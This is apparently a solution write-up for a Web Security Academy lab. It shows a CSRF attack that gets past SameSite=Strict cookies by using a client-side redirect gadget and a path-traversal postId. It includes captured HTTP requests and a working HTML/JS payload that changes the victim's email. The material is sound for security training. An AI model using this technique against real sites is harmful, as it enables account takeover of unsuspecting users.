This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

POST /login response:
```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=VTthQdX4p7PndBTGsTHvSxmzlCB0xBma; Secure; HttpOnly; SameSite=Strict
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
- SameSite=Strict

POST Change email request:
```http
POST /my-account/change-email HTTP/2
Host: 0a470025038aeae58050769200450032.web-security-academy.net
Cookie: session=VTthQdX4p7PndBTGsTHvSxmzlCB0xBma
...
email=test%40test.net&submit=1
```
- response 302 Found


Test `GET /my-account/change-email?email=test%40test.net&submit=1`
- response 302 Found

## Client-side Redirect Gadget
There is a comment function in the site.

1. POST comment
```http
POST /post/comment HTTP/2
Host: 0a470025038aeae58050769200450032.web-security-academy.net
...
postId=3&comment=test&name=wiener&email=test%40test.net&website=https%3A%2F%2Fsome-site.com
```
- 302 Found


2. Redirect request
```http
GET /post/comment/confirmation?postId=3 HTTP/2
Host: 0a470025038aeae58050769200450032.web-security-academy.net
Cookie: session=VTthQdX4p7PndBTGsTHvSxmzlCB0xBma
```

Response 200 OK
```html
...
<script src='/resources/js/commentConfirmationRedirect.js'></script>
    <script>redirectOnConfirmation('/post');</script>
        <h1>Thank you for your comment!</h1>
        <p>Your comment has been submitted. You will be redirected momentarily.</p>
        ...
```


GET /resources/js/commentConfirmationRedirect.js
```js
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 231

redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
- Note that `blogPath = /post` so we need to use `../` in postId


## Deliver exploit

```html
<script>
document.location = 'https://0a470025038aeae58050769200450032.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=changed%40test.net%26submit=1'
</script>
```
- `../` to traverse back to root path
- `%26submit=1 = &submit=1` - need to URL encode `&` 
